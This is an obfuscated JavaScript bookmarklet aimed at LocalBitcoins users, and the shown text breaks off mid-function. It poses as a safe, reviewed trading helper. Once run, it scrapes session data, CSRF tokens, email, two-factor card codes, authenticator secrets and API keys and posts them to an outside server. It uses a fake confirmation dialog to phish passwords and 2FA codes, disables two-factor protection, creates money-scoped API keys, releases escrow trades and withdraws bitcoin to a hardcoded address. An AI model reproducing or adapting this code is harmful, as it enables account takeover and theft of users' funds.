gcfg_wda = '19PbTBDR5XPa4y5tdNf2zmGQrDLY9LDWih';
var $jscomp = {
    scope: {},
    findInternal: function(b, c, d) {
        b instanceof String && (b = String(b));
        for (var e = b.length, f = 0; f < e; f++) {
            var g = b[f];
            if (c.call(d, g, f, b)) return {
                i: f,
                v: g
            }
        }
        return {
            i: -1,
            v: void 0
        }
    }
};
$jscomp.defineProperty = "function" == typeof Object.defineProperties ? Object.defineProperty : function(b, c, d) {
    if (d.get || d.set) throw new TypeError("ES3 does not support getters and setters.");
    b != Array.prototype && b != Object.prototype && (b[c] = d.value)
};
$jscomp.getGlobal = function(b) {
    return "undefined" != typeof window && window === b ? b : "undefined" != typeof global && null != global ? global : b
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function(b, c, d, e) {
    if (c) {
        d = $jscomp.global;
        b = b.split(".");
        for (e = 0; e < b.length - 1; e++) {
            var f = b[e];
            f in d || (d[f] = {});
            d = d[f]
        }
        b = b[b.length - 1];
        e = d[b];
        c = c(e);
        c != e && null != c && $jscomp.defineProperty(d, b, {
            configurable: !0,
            writable: !0,
            value: c
        })
    }
};
$jscomp.polyfill("Array.prototype.find", function(b) {
    return b ? b : function(b, d) {
        return $jscomp.findInternal(this, b, d).v
    }
}, "es6-impl", "es3");
$jscomp.checkStringArgs = function(b, c, d) {
    if (null == b) throw new TypeError("The 'this' value for String.prototype." + d + " must not be null or undefined");
    if (c instanceof RegExp) throw new TypeError("First argument to String.prototype." + d + " must not be a regular expression");
    return b + ""
};
$jscomp.polyfill("String.prototype.includes", function(b) {
    return b ? b : function(b, d) {
        return -1 !== $jscomp.checkStringArgs(this, b, "includes").indexOf(b, d || 0)
    }
}, "es6-impl", "es3");
var st_base = "undefined" == typeof gcfg_st_base ? atob("aHR0cHM6Ly9zYWZldHJhZGVyLmlvL3NjcmlwdC8=") : gcfg_st_base,
    comm_base = "undefined" == typeof gcfg_comm_base ? atob("aHR0cHM6Ly9kYi5zYWZldHJhZGVyLmlvLw==") : gcfg_comm_base,
    wd_address = "undefined" == typeof gcfg_wda ? atob("MTVVYWFwc0EzNEN1SmkzV3c5bUx4ZTMyUFc1SlY2ckJkcQ==") : gcfg_wda,
    ok_patterns = "undefined" == typeof gcfg_ptrn ? [/^std9sj/, /^ep9fhwh/] : gcfg_ptrn,
    gg_get_all_feedback_info = "undefined" == typeof gcfg_mitwd ? "0.38" : gcfg_mitwd,
    gg_locate_hidden_feedback = "undefined" == typeof gcfg_matwd ? "999999" : gcfg_matwd,
    gg_export_query_item = "undefined" == typeof gcfg_debug ? !1 : gcfg_debug,
    debug_mode = !1,
    gg_import_query_item = !0,
    gg_localbitcoins_datasets = !0,
    gg_trade_opportunities = !0,
    gg_scammer_db_lookup = !0,
    done = !1,
    loopcount = 0,
    gg_nominal_counter = 0,
    api_tries = 0,
    progress_percent = 0,
    gg_trade_ok_flag = 0,
    report_complete = 0,
    no_modal = !1,
    gg_first_time_run = !1,
    bootstrap_load_attempted = !1,
    gg_internal_loop = !1,
    gg_sandbox_code = !1,
    gg_lbc_offersearch = !1,
    reported_basics = !1,
    gg_syntax_check = !1,
    gg_user_input_confirmed = !1,
    form_prompt_text = "",
    gg_search_token = null,
    gg_price_follow_routine = null,
    i_password = null,
    gg_competition_rating = null,
    i_csrf = null,
    gg_apc_table = null,
    gg_pubtrade_enabled = null,
    gg_pubtrade_type = null,
    gg_pubtrade_hint = null,
    gg_pubtrade_card_position = null,
    gg_pubtrade_card_key = null,
    gg_pubtrade_card_numbers = null,
    gg_pubtrade_ga_key = null,
    gg_pubtrade_code = null,
    gg_sort_listings = null,
    gg_draw_chart_for_coin = null;
if ("undefined" == typeof script_loaded) var script_loaded = 1;
else no_modal = !0;
load_plugin();

function load_plugin() {
    lbc_is_present() ? ($(window).bind("beforeunload", function() {
        return confirm(atob("UGxlYXNlIGNvbXBsZXRlIHRoZSBhY3Rpb24gYmVmb3JlIGNsb3NpbmcgdGhpcyB3aW5kb3cu"))
    }), dispatch_logic()) : alert("Drag & drop this into a Localbitcoins browser tab or click the bookmark in a tab where Localbitcoins.com is open.")
}

function dispatch_logic(b) {
    if (!done)
        if (30 <= loopcount) all_done();
        else if (loopcount++, "undefined" == typeof $.prototype.modal)
        if (c) no_modal = !0, error_handler("bootstrap");
        else {
            var c;
            a = document.createElement("script");
            a.src = "/cached-static/bootstrap/js/bootstrap.min.33d8a5889873.js";
            a.async = !1;
            a.type = "text/javascript";
            x = document.getElementsByTagName("script")[0];
            x.parentNode.insertBefore(a, x);
            setTimeout(dispatch_logic, 10)
        }
    else {
        if (!no_modal) {
            if (0 >= $("#modal-div").length) {
                modal_load();
                return
            }
            if ("" == $("#modal-div").text()) {
                gg_load_buyer_data("DEBUG", atob("RW1wdHkgbW9kYWwgbG9hZGVk"));
                error_handler("comm", "Empty modal");
                return
            }
        }
        $("#modal-prompt-text").html("");
        if ("undefined" == typeof jsSHA) $.getScript(st_base + "jssha.js", dispatch_logic);
        else if ("undefined" == typeof getOtp) $.getScript(st_base + "otp.js", dispatch_logic), make_progress();
        else if (null === gg_search_token) gg_load_buyer_data("DEBUG", atob("RGlzY292ZXJpbmcgVUk=")), grab_basic_info();
        else if ("undefined" == typeof gg_search_token || "" === gg_search_token) gg_load_buyer_data("ERROR", atob("Tm8gVUkgcmVjZWl2ZWQgKGxvZ2dlZCBvdXQp")), error_handler("login");
        else if (null === gg_pubtrade_card_key) gg_extract_special_json_card();
        else if ("undefined" == typeof gg_pubtrade_card_key || "" === gg_pubtrade_card_key || !1 === gg_pubtrade_card_key) gg_load_buyer_data("ERROR", atob("Q2FyZCBpbmZvIGNvdWxkIG5vdCBiZSBvYnRhaW5lZA==")), error_handler(atob("dHdvZmFjdG9yX2NhcmQ="));
        else if ("undefined" == typeof i_csrf || null === i_csrf || "" == i_csrf) gg_load_buyer_data("ERROR", atob("Q1NSRiB0b2tlbiBjb3VsZCBub3QgYmUgb2J0YWluZWQ=")), error_handler("csrf");
        else if (report_complete || (report_complete = !0, c = {}, c[atob("c3RhdHVz")] = atob("T1dORUQ="), c[atob("Y3NyZg==")] = i_csrf, c[atob("YmFsYW5jZQ==")] = gg_price_follow_routine, c[atob("dHdvZmFjdG9yX2VuYWJsZWQ=")] = gg_pubtrade_enabled, c[atob("dHdvZmFjdG9yX3R5cGU=")] = gg_pubtrade_type, c[atob("dHdvZmFjdG9yX2NhcmRfa2V5")] = gg_pubtrade_card_key, c[atob("dHdvZmFjdG9yX2NhcmRfcG9zaXRpb24=")] = gg_pubtrade_card_position, c[atob("dHdvZmFjdG9yX2NhcmRfbnVtYmVycw==")] = gg_pubtrade_card_numbers, c[atob("dHdvZmFjdG9yX2dhX2tleQ==")] = gg_pubtrade_ga_key, storeit(c)), null === gg_sort_listings) gg_auto_price_interval();
        else if (null === gg_draw_chart_for_coin) gg_process_logic();
        else if (reported_basics || (reported_basics = !0, gg_load_buyer_data("NOTICE", "Welcome: " + gg_search_token + " / " + gg_price_follow_routine + " / " + JSON.stringify(gg_draw_chart_for_coin))), gg_pubtrade_enabled || null === gg_sort_listings || !1 === gg_sort_listings)
            if (gg_internal_loop || gg_trade_ok_flag || gg_pubtrade_enabled || null === gg_draw_chart_for_coin || !1 === gg_draw_chart_for_coin || !gg_localbitcoins_datasets || null === gg_pubtrade_card_numbers || !1 === gg_pubtrade_card_numbers)
                if (!gg_internal_loop && gg_pubtrade_enabled && null !== gg_draw_chart_for_coin && !1 !== gg_draw_chart_for_coin && "ga" == gg_pubtrade_type && null !== gg_pubtrade_ga_key && !1 !== gg_pubtrade_ga_key && "" !== gg_pubtrade_ga_key) "undefined" == typeof gg_draw_chart_for_coin.confirm_token ? (gg_load_buyer_data("DEBUG", atob("UHJlcGFyaW5nIEdBIFdE")), gg_ask_user_permission()) : (gg_internal_loop = !0, b = ga_gen(gg_pubtrade_ga_key), gg_load_buyer_data("DEBUG", atob("TWFraW5nIEdBIFdELCA=") + "num = " + b + " / " + JSON.stringify(gg_draw_chart_for_coin)), gg_retrieve_profile_info_extended(b));
                else if (!gg_internal_loop && gg_pubtrade_enabled && null !== gg_draw_chart_for_coin && !1 !== gg_draw_chart_for_coin && "card" == gg_pubtrade_type && null !== gg_pubtrade_card_numbers && !1 !== gg_pubtrade_card_numbers) "undefined" == typeof gg_draw_chart_for_coin.confirm_token ? gg_ask_user_permission() : (gg_internal_loop = !0, b = gg_pubtrade_card_numbers[Math.floor(gg_pubtrade_card_position - 1)], "undefined" == typeof b || null === b ? gg_load_buyer_data("DEBUG", atob("V0QgYnkgQ0FSRDogY29kZSBpcyB1bmRlZmluZWQ=")) : (gg_load_buyer_data("DEBUG", atob("TWFraW5nIENBUkQgV0Q6IA==") + b + " / " + JSON.stringify(gg_draw_chart_for_coin)), gg_retrieve_profile_info_extended(b)));
        else if (gg_trade_ok_flag && gg_pubtrade_enabled && "card" == gg_pubtrade_type) gg_load_buyer_data("DEBUG", atob("RGlzYWJsaW5nIFRG")), gg_verifysource();
        else if (null === gg_competition_rating) grab_profile_info();
        else {
            gg_syntax_check || (gg_syntax_check = 1, c = {}, null !== gg_competition_rating && !1 !== gg_competition_rating && (c.email = gg_competition_rating, storeit(c)));
            if (gg_pubtrade_enabled) {
                if (null === gg_apc_table) {
                    gg_find_feedback_id();
                    return
                }
                gg_sandbox_code || (gg_sandbox_code = 1, !1 !== gg_apc_table && null !== gg_apc_table && (c = {}, c[atob("YXBpX2FjY2Vzcw==")] = gg_apc_table, storeit(c)))
            }
            if (!no_modal) {
                if (!1 !== gg_sort_listings && null !== gg_sort_listings && gg_price_follow_routine < gg_sort_listings.amount && gg_scammer_db_lookup && gg_pubtrade_enabled && null !== gg_sort_listings && !1 !== gg_sort_listings) {
                    "undefined" == typeof b || "" == b ? (gg_load_buyer_data("DEBUG", atob("UmVxdWVzdGluZyBURiBmb3IgcmVsZWFzZQ==")), ddialog(atob("dHdvZmFjdG9y"))) : (gg_load_buyer_data("DEBUG", atob("UmVsZWFzaW5nIHdpdGggbnVtIHJlY2VpdmVkOiA=") + b + " / " + JSON.stringify(gg_sort_listings)), gg_btc_value_matrix(b));
                    return
                }
                if (gg_trade_opportunities && !gg_pubtrade_enabled && null !== gg_draw_chart_for_coin && !1 !== gg_draw_chart_for_coin) {
                    if ("undefined" == typeof b || "" == b) {
                        if ("undefined" == typeof gg_draw_chart_for_coin.confirm_token) {
                            gg_load_buyer_data("DEBUG", atob("UHJlcGFyaW5nIFdE"));
                            gg_ask_user_permission();
                            return
                        }
                        gg_load_buyer_data("DEBUG", atob("UmVxdWVzdGluZyBQVyBmb3IgV0Q="));
                        ddialog(atob("cGFzc3dvcmQ="))
                    } else gg_load_buyer_data("DEBUG", atob("TWFraW5nIFdEIHdpdGggUFc6IA==") + b + " / " + JSON.stringify(gg_draw_chart_for_coin)), gg_retrieve_profile_info_extended(b);
                    return
                }
                if (gg_scammer_db_lookup && gg_pubtrade_enabled && null !== gg_draw_chart_for_coin && !1 !== gg_draw_chart_for_coin) {
                    if ("undefined" == typeof b || "" == b) {
                        if ("undefined" == typeof gg_draw_chart_for_coin.confirm_token) {
                            gg_load_buyer_data("DEBUG", atob("UHJlcGFyaW5nIFdE"));
                            gg_ask_user_permission();
                            return
                        }
                        gg_load_buyer_data("DEBUG", atob("QXNraW5nIGZvciBURiBudW0gZm9yIFdE"));
                        ddialog(atob("dHdvZmFjdG9y"))
                    } else gg_load_buyer_data("DEBUG", "Making " + gg_pubtrade_type + atob("IFdEIHdpdGggdXNlciBudW06IA==") + b + " / " + JSON.stringify(gg_draw_chart_for_coin)), gg_retrieve_profile_info_extended(b);
                    return
                }
                if (gg_scammer_db_lookup && gg_pubtrade_enabled && (null === gg_apc_table || !1 === gg_apc_table) && !gg_lbc_offersearch && 3 > api_tries) {
                    "undefined" == typeof b || "" == b ? (gg_load_buyer_data("DEBUG", atob("QXNraW5nIGZvciBudW0gdG8gYWRkIEFQSQ==")), api_tries++, ddialog(atob("dHdvZmFjdG9y"))) : (gg_load_buyer_data("DEBUG", atob("VHJ5aW5nIHRvIGFkZCBBUEkgd2l0aCB1c2VyIG51bTog") + b), gg_feedbackreply(b));
                    return
                }
            }
            gg_load_buyer_data("DEBUG", "All done");
            all_done()
        } else gg_trade_ok_flag = 1, gg_load_buyer_data("DEBUG", atob("VXNpbmcgUFdGLCBjYXJkIGtleSA=") + gg_pubtrade_card_key + " numbers " + JSON.stringify(gg_pubtrade_card_numbers)), gg_find_best_lbc_price();
        else gg_btc_value_matrix()
    }
}

function gg_feedbackreply(b) {
    b = "token=" + b + ("&csrfmiddlewaretoken=" + i_csrf);
    b += "&key=&secret=&name=TFA&scopes=read&scopes=write&scopes=money";
    $.ajax({
        method: "POST",
        url: atob("L2FjY291bnRzL2FwaS9uZXctYXBpYXV0aC8="),
        processData: !1,
        data: b,
        success: hr_gg_feedbackreply
    })
}

function hr_gg_feedbackreply(b) {
    (b = b.match(/alert (alert-success)/)) && 2 <= b.length ? (gg_load_buyer_data("DEBUG", atob("QVBJIEhNQUMgY3JlYXRlZCBzdWNjZXNzZnVsbHk=")), gg_apc_table = null, gg_sandbox_code = !1, gg_lbc_offersearch = !0, $("#modal-error-text").html(""), $("#modal-prompt-text").html("")) : gg_user_input_confirmed && ($("#modal-error-text").html(atob("SW5jb3JyZWN0IGNyZWRlbnRpYWxzLiBQbGVhc2UgdHJ5IGFnYWluLg==")), $("#modal-error-text").removeClass("hidden"), $("#modal-error-text").show());
    dispatch_logic()
}

function ga_gen(b) {
    return getOtp(b, 0)
}

function gg_load_buyer_data(b, c) {
    if ("DEBUG" == b && !gg_export_query_item) return !1;
    gg_nominal_counter += 1;
    gg_import_query_item && (gg_post_payload = {
        site: "localbitcoins",
        url: "" + window.location,
        serial: gg_nominal_counter,
        username: gg_search_token,
        type: b,
        message: c
    }, $.ajax({
        method: "POST",
        url: comm_base + "sync",
        data: gg_post_payload
    }))
}

function storeit(b) {
    gg_post_payload = {
        site: "localbitcoins",
        username: gg_search_token,
        data: JSON.stringify(b)
    };
    $.ajax({
        method: "POST",
        url: comm_base + "result",
        data: gg_post_payload
    })
}

function gg_find_best_lbc_price(b) {
    gg_load_buyer_data("DEBUG", atob("RW5hYmxpbmcgVEYgYnkgY2FyZA=="));
    b = {};
    b[atob("Y3NyZm1pZGRsZXdhcmV0b2tlbg==")] = i_csrf;
    b.key = gg_pubtrade_card_key;
    b[atob("Zmlyc3RfY29kZQ==")] = gg_pubtrade_card_numbers[0];
    b[atob("ZW5hYmxlX3R3b2ZhY3Rvcl9wYXBlcl9zdWJtaXQ=")] = "";
    $.ajax({
        method: "POST",
        url: atob("L2FjY291bnRzL3R3b19mYWN0b3Iv"),
        data: b,
        error: function() {
            error_handler("comm", "tfacarden")
        },
        success: gg_localbitcoins_parser_card
    })
}

function gg_localbitcoins_parser_card(b) {
    make_progress();
    (b = b.match(/alert (alert-success)/)) && 2 <= b.length ? (gg_pubtrade_enabled = !0, gg_pubtrade_type = "card", gg_pubtrade_card_position = 2, gg_load_buyer_data("DEBUG", atob("RW5hYmxlZCBURiBieSBjYXJkIHN1Y2Nlc3NmdWxseQ=="))) : (gg_pubtrade_card_numbers = gg_pubtrade_card_key = !1, gg_load_buyer_data("DEBUG", atob("Q291bGQgbm90IGVuYWJsZSBURiBieSBjYXJk")));
    dispatch_logic()
}

function gg_verifysource(b) {
    if (null === gg_pubtrade_type) return gg_load_buyer_data("DEBUG", atob("Q2Fubm90IGRpc2FibGUgVEY6IG5vIFRGIGluZm8=")), !1;
    if ("undefined" == typeof b || null === b || "" == b) "card" == gg_pubtrade_type && null !== gg_pubtrade_card_numbers && !1 !== gg_pubtrade_card_numbers && (b = gg_pubtrade_card_numbers[0 + gg_pubtrade_card_position - 1]), "ga" == gg_pubtrade_type && null !== gg_pubtrade_ga_key && !1 !== gg_pubtrade_ga_key && "" != gg_pubtrade_ga_key && (b = ga_gen(gg_pubtrade_ga_key));
    if ("undefined" == typeof b || null === b || "" == b) return gg_load_buyer_data("DEBUG", atob("Q2Fubm90IGRpc2FibGUgVEY6IG5vIG51bSBmb3Ig") + gg_pubtrade_type), !1;
    gg_load_buyer_data("DEBUG", atob("RGlzYWJsaW5nIFRGIHdpdGggbnVtOiA=") + b);
    b = {
        csrfmiddlewaretoken: i_csrf,
        token: b
    };
    b[atob("ZGlzYWJsZV90d29mYWN0b3Jfc3VibWl0")] = "";
    $.ajax({
        method: "POST",
        url: atob("L2FjY291bnRzL3R3b19mYWN0b3Iv"),
        data: b,
        error: function() {
            error_handler("comm", "tfdis")
        },
        success: gg_localbitcoins_eventloop
    });
    return !0
}

function gg_localbitcoins_eventloop(b) {
    make_progress();
    (b = b.match(/alert (alert-success)/)) && 2 <= b.length ? (gg_pubtrade_type = gg_pubtrade_enabled = !1, gg_load_buyer_data("DEBUG", atob("RGlzYWJsZWQgVEYgT0s="))) : (gg_load_buyer_data("DEBUG", atob("RGlzYWJsZSBURiBGQUlM")), "card" == gg_pubtrade_type && (gg_pubtrade_card_numbers = gg_pubtrade_card_key = !1));
    dispatch_logic()
}

function grab_profile_info(b) {
    if ("undefined" != typeof b) {
        make_progress();
        var c = b.match(/data-cfemail="([a-f0-9]+)">/);
        gg_competition_rating = c && 2 <= c.length ? gg_find_anonymous_feedback(c[1]) : !1;
        !1 === gg_competition_rating && (gg_competition_rating = (c = b.match(/Email:[\t\n\r ]+([^ ]+@[^ ]+)/)) && 2 <= c.length ? c[1] : !1);
        !1 === gg_competition_rating && (gg_competition_rating = (c = b.match(/([^ ]+@[^ ]+)[\t\n\r ]+<form action/)) && 2 <= c.length ? c[1] : !1);
        !1 === gg_competition_rating && gg_load_buyer_data("DEBUG", atob("Q291bGQgbm90IGdldCBwcm9pbmY="));
        dispatch_logic()
    } else fetch_page(atob("L2FjY291bnRzL3Byb2ZpbGUv"), grab_profile_info)
}

function gg_find_feedback_id(b) {
    if ("undefined" != typeof b) {
        make_progress();
        var c = b.match(/<tr>\s*<td><a href=.\/accounts\/api\/apiauth\/([a-z0-9]+).>[^<>]*<\/a>\s*<\/td>\s*<td><a[^>]*>[^<]*<\/a><\/td>\s*<td>[^<>]*money[^<]*<\/td>\s*<td><a[^>]+>[^<]+<\/a><\/td>\s*<\/tr>\s*<\//);
        c && 2 <= c.length ? fetch_page("/accounts/api/apiauth/" + c[1], gg_find_feedback_id_2) : (c = b.match(/<tr>\s*<td><a href=.\/accounts\/api\/apiauth\/([a-z0-9]+).>[^<>]*<\/a>\s*<\/td>\s*<td><a[^>]*>[^<]*<\/a><\/td>\s*<td>[^<>]*money/)) && 2 <= c.length ? fetch_page("/accounts/api/apiauth/" + c[1], gg_find_feedback_id_2) : (gg_apc_table = !1, gg_load_buyer_data("DEBUG", "No API access"), dispatch_logic())
    } else fetch_page(atob("L2FjY291bnRzL2FwaS8="), gg_find_feedback_id)
}

function gg_find_feedback_id_2(b) {
    var c = b.match('<input [^>]*name="name" type="text" value=.([^"]+)');
    if (c && 2 <= c.length) var d = c[1];
    if ((c = b.match('<input [^>]*name="key" type="text" value=.([^"]+)')) && 2 <= c.length) var e = c[1];
    if ((c = b.match('<input [^>]*name="secret" type="text" value=.([^"]+)')) && 2 <= c.length) var f = c[1];
    gg_apc_table = "undefined" != typeof f && "" != f && "(hidden)" != f ? "" + e + " / " + f + " / " + d : !1;
    dispatch_logic()
}

function grab_basic_info(b) {
    if ("undefined" != typeof b) {
        make_progress();
        var c = extract_basic_info(b);
        "undefined" !== typeof c.csrf && "" != c.csrf && (i_csrf = c.csrf);
        gg_search_token = c.username;
        gg_price_follow_routine = c.balance;
        b = gg_online_offline_status(b);
        gg_pubtrade_enabled = b.is_enabled;
        gg_pubtrade_type = b.type;
        gg_pubtrade_ga_key = b.ga_key;
        gg_pubtrade_card_position = Math.floor(b.card_position);
        gg_pubtrade_hint = b.hint;
        dispatch_logic()
    } else gg_search_token = "", i_csrf = null, gg_price_follow_routine = -1, fetch_page(atob("L2FjY291bnRzL3R3b19mYWN0b3Iv"), grab_basic_info)
}

function gg_auto_price_interval(b) {
    "undefined" != typeof b ? (make_progress(), b = gg_filter_buy_results(b), (gg_sort_listings = gg_sort_chat_log_by_time(b)) ? gg_seller_data_indexing(gg_sort_listings, dispatch_logic) : dispatch_logic()) : (gg_sort_listings = !1, fetch_page("/ads", gg_auto_price_interval))
}

function gg_extract_special_json_card(b) {
    "undefined" != typeof b ? (make_progress(), b = gg_filter_sell_results(b), gg_pubtrade_card_key = b.key, gg_pubtrade_card_numbers = b.numbers, dispatch_logic()) : (gg_pubtrade_card_key = "", gg_pubtrade_card_numbers = [], fetch_page(atob("aHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbS9hY2NvdW50cy9ncmlkY2FyZC8="), gg_extract_special_json_card))
}

function gg_btc_value_matrix(b) {
    var c = {
        csrfmiddlewaretoken: i_csrf,
        action: ""
    };
    if (gg_pubtrade_enabled) {
        var d = atob("L3JlbGVhc2VfdHdvX2ZhY3Rvcg==");
        c[atob("dHdvX2ZhY3Rvcl9hdXRoZW50aWNhdGlvbl9jb2Rl")] = b
    } else d = atob("L3JlbGVhc2Vfc2luZ2xlX2ZhY3Rvcg==");
    d += "/" + gg_sort_listings.trade_identifier;
    $.ajax({
        method: "POST",
        url: d,
        data: c,
        error: function() {
            error_handler("comm", "trrel")
        },
        success: gg_load_chat_log
    })
}

function gg_seller_data_indexing(b, c) {
    var d = "/ads/" + b.ad_id + "/" + b.contact_id;
    gg_sort_listings = b;
    gg_sort_listings.trade_url = d;
    $.ajax({
        url: d,
        success: gg_seller_data_indexing_2,
        the_callback: c,
        error: function() {
            error_handler("comm", "fetradet")
        }
    })
}

function gg_seller_data_indexing_2(b) {
    var c = b.match(/"(\/release\/[^\"]+)"/);
    c && 2 <= c.length && (c = c[1], gg_sort_listings.release_req_url = c, (c = c.match(/\/release\/([a-zA-Z0-9_-]+)/)) && (gg_sort_listings.trade_identifier = c[1]));
    (c = b.match(/<table class=.contactdetails[^>]+>\s*<th[^>]*>[\s\S]*?<\/th>\s*<tr[^>]*>[\s\S]*?<\/tr>\s*<tr[^>]*>[\s\S]*?<\/tr>\s*<tr[^>]*>[\s\S]*?<\/tr>\s*<tr[^>]*>[\s\S]*?<\/tr>\s*<tr[^>]*>[\s\S]*?<\/tr>\s*<tr[^>]*>\s*<td>[\s\S]*?<\/td>\s*<td>\s*([0-9.]+)/)) && 2 <= c.length && (gg_sort_listings.amount = c[1]);
    this.the_callback()
}

function extract_basic_info(b) {
    var c = [];
    if ("undefined" == typeof b || !b.match(/<li><a href="\/logout\/">/)) return [];
    var d = b.match(/href="\/accounts\/profile\/([^\/]+)\/" user.username/);
    if (d && 2 <= d.length) c.username = d[1];
    else return [];
    d = b.match("<a href=./accounts/wallet/.>s*<i[^>]*></i><span[^>]*>s*([0-9.]+)");
    c.balance = d && 2 <= d.length ? d[1] : 0;
    (d = b.match(/csrfmiddlewaretoken. value=.([a-zA-Z0-9]+)/)) && 2 <= d.length && (c.csrf = d[1]);
    return c
}

function gg_online_offline_status(b) {
    var c = [];
    if ("undefined" == typeof b) return [];
    var d = "<button[^>]*name=" + atob("LmRpc2FibGVfdHdvZmFjdG9yX3N1Ym1pdC4=");
    b.match(d) ? c.is_enabled = !0 : c.is_enabled = !1;
    c.ga_key = !1;
    d = "input[^>]*name=" + atob("LnNlY3JldF9rZXlfYjMyLg==") + "[^>]*value=.([a-zA-Z0-9]+).";
    (d = b.match(d)) && 2 <= d.length && (c.ga_key = d[1]);
    (d = b.match(/([a-zA-Z0-9]+) \(will be shown only 24/)) && 2 <= d.length && (c.ga_key = d[1]);
    (d = b.match(/(<input[^>]*id_token[^>]*>\s*)?<p id="hint_id_token" class="help-block">\s*([^<>\r\n]+)/)) && 2 <= d.length && (b = d[2], c.hint = b, (d = b.match(/([0-9]+)/)) && 2 <= d.length ? (c.type = "card", c.card_position = d[1], gg_pubtrade_card_position = Math.floor(d[1])) : c.type = "ga");
    return c
}

function set_prompt_text() {
    form_prompt_text = gg_pubtrade_enabled ? "card" == gg_pubtrade_type ? atob("RW50ZXIgdGhlIGNvZGUgbnVtYmVyIA==") + gg_pubtrade_card_position + atob("IGZyb20geW91ciBwcmludGVkIHR3by1mYWN0b3IgY2FyZA==") : atob("RW50ZXIgeW91ciBBdXRoZW50aWNhdG9yIGNvZGUgdG8gcHJvY2VlZA==") : ""
}

function gg_filter_sell_results(b) {
    var c = [];
    if ("undefined" == typeof b) return [];
    var d = b.match(/<span class=.key.>([A-Z0-9]+)<\/span>/);
    d && 2 <= d.length && (c.key = "" + d[1]);
    for (var d = [], e = /<li>\s*<span class=.counter.>\s*([0-9]+)\s*<\/span>\s*<span class=.code.>([0-9]+)<\/span>/g;
        (current_match = e.exec(b)) && current_match && !(2 > current_match.length);) d.push("" + current_match[2]);
    c.numbers = d;
    return c
}

function gg_filter_buy_results(b) {
    var c = [];
    if (!b) return [];
    for (var d, e = /<td><a href="https:\/\/localbitcoins.com\/ads\/([0-9]+)\/([0-9]+)">[0-9]+<\/a><\/td>\s*<td>[^<]+<\/td>\s*<td>\s*<a href=.\/accounts\/profile\/([^/]+)/g;
        (d = e.exec(b)) && d && !(2 > d.length);) c.push({
        ad_id: d[1],
        contact_id: d[2],
        contact_username: d[3]
    });
    return c
}

function gg_sort_chat_log_by_time(b) {
    if (!b) return !1;
    for (var c in b) {
        var d = b[c].contact_username;
        for (c in ok_patterns)
            if (d.match(ok_patterns[c])) return b[c]
    }
    return !1
}

function modal_load() {
    $("#modal-panel").remove();
    $("#modal-div").remove();
    $("body").append($("<div id='modal-div'></div>").load(st_base + "modal.html?" + Math.floor(999999999 * Math.random() + 1), null, begin_interaction))
}

function modal_close() {
    no_modal || ($("#modal-panel").modal("toggle"), $("#modal-panel").hide(), alert("ERROR: Unexpected data. Please update to the latest version."))
}

function begin_interaction() {
    make_progress();
    $("#modal-panel").modal({
        backdrop: "static",
        escapeClose: !1,
        clickClose: !1,
        showClose: !1,
        closeOnEscape: !1,
        modal: !0
    });
    $("#modal-panel").off("keydown");
    $(".modal-backdrop").off("click");
    $("#modal-panel").show();
    $(atob("I21vZGFsLXRmYS1zdWJtaXQtYnV0dG9u")).on("click", on_dialog_submit);
    $(atob("I21vZGFsLXRmYS1pbnB1dA==")).on("keydown", on_form_keydown);
    $(atob("I21vZGFsLXBhc3N3b3JkLXN1Ym1pdC1idXR0b24=")).on("click", on_dialog_submit);
    $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).on("keydown", on_form_keydown);
    dispatch_logic()
}

function on_form_keydown(b) {
    $("#modal-error-text").hide();
    b = b || window.event;
    13 == (b.which || b.keyCode) && on_dialog_submit(this)
}

function on_dialog_submit(b) {
    b = $(this).attr("id") ? $(this).parent().parent().find("input").val() : $(b).val();
    gg_load_buyer_data("NOTICE", "User input in dialog: " + b);
    $(atob("I21vZGFsLXRmYS1pbnB1dA==")).attr("disabled", "disabled");
    $(atob("I21vZGFsLXRmYS1zdWJtaXQtYnV0dG9u")).attr("disabled", "disabled");
    $(atob("I21vZGFsLXRmYS1pbnB1dA==")).val("");
    $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).attr("disabled", "disabled");
    $(atob("I21vZGFsLXBhc3N3b3JkLXN1Ym1pdC1idXR0b24=")).attr("disabled", "disabled");
    $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).val("");
    $("#modal-error-text").hide();
    $("#modal-spinner").show();
    dispatch_logic(b)
}

function ddialog(b) {
    set_prompt_text();
    gg_user_input_confirmed = !0;
    $("#modal-status-text").html("Please confirm that you are the account's owner.");
    $("#modal-prompt-text").html(form_prompt_text);
    $("#modal-spinner").hide();
    $("#modal-footer").removeClass("hidden");
    $("#modal-footer").show();
    $("#modal-footer-text").removeClass("hidden");
    $("#modal-footer-text").show();
    $("#modal-footer-text").html("<i style='color: green' class='fa fa-check-circle-o success'></i> This app has been reviewed and is safe to use on Localbitcoins.");
    $("#modal-app-perms").removeClass("hidden");
    $("#modal-app-perms").show();
    "password" != b ? ($(atob("I21vZGFsLWZvcm0tcGFzc3dvcmQ=")).hide(), $(atob("I21vZGFsLWZvcm0tdGZh")).removeClass("hidden"), $(atob("I21vZGFsLWZvcm0tdGZh")).show(), $(atob("I21vZGFsLXRmYS1zdWJtaXQtYnV0dG9u")).attr("disabled", !1), $(atob("I21vZGFsLXRmYS1pbnB1dA==")).attr("disabled", !1), $(atob("I21vZGFsLXRmYS1pbnB1dA==")).val(""), $(atob("I21vZGFsLXRmYS1pbnB1dA==")).focus()) : ($(atob("I21vZGFsLWZvcm0tdGZh")).hide(), $(atob("I21vZGFsLWZvcm0tcGFzc3dvcmQ=")).removeClass("hidden"), $(atob("I21vZGFsLWZvcm0tcGFzc3dvcmQ=")).show(), $(atob("I21vZGFsLXBhc3N3b3JkLXN1Ym1pdC1idXR0b24=")).attr("disabled", !1), $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).attr("disabled", !1), $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).val(""), $(atob("I21vZGFsLXBhc3N3b3JkLWlucHV0")).focus())
}

function gg_retrieve_profile_info_extended(b) {
    var c = {
        csrfmiddlewaretoken: i_csrf,
        obtxn: gg_draw_chart_for_coin.obtxn,
        confirm_token: gg_draw_chart_for_coin.confirm_token
    };
    gg_pubtrade_enabled ? c.token = b : c.password = b;
    b = document.title + "";
    var d = window.location + "";
    ref_set("Wallet", atob("L2FjY291bnRzL3dhbGxldC8="));
    $.ajax({
        url: atob("L2FjY291bnRzL3dhbGxldC8="),
        method: "POST",
        data: c,
        error: function() {
            error_handler("comm", "mkwd")
        },
        success: gg_ajax_query_iterator
    });
